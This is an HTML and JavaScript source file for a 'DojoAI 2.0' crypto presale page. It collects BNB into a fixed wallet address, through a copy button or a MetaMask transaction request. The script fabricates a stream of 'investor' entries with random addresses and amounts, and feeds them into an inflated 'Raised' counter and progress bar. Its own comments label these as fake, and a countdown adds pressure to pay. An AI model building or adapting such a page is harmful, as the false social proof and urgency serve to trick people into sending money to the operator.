<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>DojoAI 2.0 Presale</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Orbitron', sans-serif;
      background-color: #0e0e0e;
      color: #f0f0f0;
      text-align: center;
      padding: 20px;
    }
    .container {
      max-width: 700px;
      margin: auto;
      padding: 30px;
      background-color: #1a1a1a;
      border-radius: 12px;
      box-shadow: 0 0 20px #00ffc3;
    }
    h1 {
      color: #00ffc3;
    }
    #countdown {
      font-size: 24px;
      margin: 20px 0;
    }
    .wallet-section {
      margin-top: 30px;
    }
    .wallet-address {
      background: #222;
      padding: 10px;
      border-radius: 8px;
      margin: 10px 0;
      word-break: break-all;
    }
    .qr-code {
      margin-top: 10px;
      width: 150px;
    }
    button {
      background: #00ffc3;
      color: #000;
      padding: 10px 20px;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 10px;
    }
    .stats {
      margin-top: 30px;
      font-size: 16px;
      color: #aaa;
    }
    .progress {
      background: #333;
      border-radius: 10px;
      height: 25px;
      margin-top: 10px;
      overflow: hidden;
    }
    .progress-bar {
      background: #00ffc3;
      height: 100%;
      width: 0%;
      transition: width 1s ease;
    }
    .investors {
      text-align: left;
      margin-top: 30px;
      font-size: 14px;
      color: #ccc;
      height: 120px;
      overflow-y: auto;
      background: #111;
      padding: 10px;
      border-radius: 8px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🚀 DojoAI 2.0 Presale</h1>
    <div id="countdown">Countdown Loading...</div>

    <div class="wallet-section">
      <h3>Send BNB to Join</h3>
      <div class="wallet-address" id="walletAddress">0x2Eb0b86bA0a09A04BE034150b3ad3A306D847918</div>
      <img src="dojoai_bnb_qr.png" alt="BNB QR Code" class="qr-code" />
      <button onclick="copyWallet()">📋 Copy Address</button>
      <button onclick="connectAndSend()">🔌 Send BNB with MetaMask</button>
    </div>

    <div class="stats">
      <p>Soft Cap: 50 BNB | Hard Cap: 200 BNB</p>
      <p>Raised: <span id="fakeRaised">0</span> BNB</p>
      <div class="progress">
        <div class="progress-bar" id="progressBar"></div>
      </div>
    </div>

    <div class="investors" id="investorList">
      <!-- Fake investor updates appear here -->
    </div>
  </div>

  <script>
    const targetDate = new Date("2025-08-01T00:00:00Z").getTime();
    const countdown = document.getElementById("countdown");
    const investorList = document.getElementById("investorList");
    const progressBar = document.getElementById("progressBar");
    const raisedDisplay = document.getElementById("fakeRaised");

    // Countdown Timer
    setInterval(() => {
      const now = new Date().getTime();
      const distance = targetDate - now;
      if (distance <= 0) {
        countdown.innerHTML = "⛔️ Presale Ended";
        return;
      }
      const days = Math.floor(distance / (1000 * 60 * 60 * 24));
      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
      const mins = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
      const secs = Math.floor((distance % (1000 * 60)) / 1000);
      countdown.innerHTML = `⏳ ${days}d ${hours}h ${mins}m ${secs}s remaining`;
    }, 1000);

    // Copy Wallet
    function copyWallet() {
      const address = document.getElementById("walletAddress").innerText;
      navigator.clipboard.writeText(address).then(() => {
        alert("BNB Address copied!");
      });
    }

    // Connect and Send via MetaMask
    async function connectAndSend() {
      if (typeof window.ethereum !== 'undefined') {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
          const from = accounts[0];
          const tx = await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [{
              from,
              to: "0x2Eb0b86bA0a09A04BE034150b3ad3A306D847918",
              value: "0x2386F26FC10000" // 0.01 BNB in wei (hex)
            }]
          });
          alert("Transaction sent: " + tx);
        } catch (err) {
          alert("Error: " + err.message);
        }
      } else {
        alert("MetaMask not detected.");
      }
    }

    // Fake Investor Generator
    let fakeRaised = 0;
    function randomInvestor() {
      const address = "0x" + Math.random().toString(16).substr(2, 4) + "..." + Math.random().toString(16).substr(2, 4);
      const amount = (Math.random() * (1 - 0.01) + 0.01).toFixed(3);
      fakeRaised += parseFloat(amount);
      if (fakeRaised > 200) fakeRaised = 200;
      raisedDisplay.innerText = fakeRaised.toFixed(2);
      progressBar.style.width = (fakeRaised / 200) * 100 + "%";
      const entry = document.createElement("div");
      entry.textContent = `${amount} BNB from ${address}`;
      investorList.prepend(entry);
    }
    setInterval(randomInvestor, 15000); // Every 15 seconds
  </script>
</body>
</html>
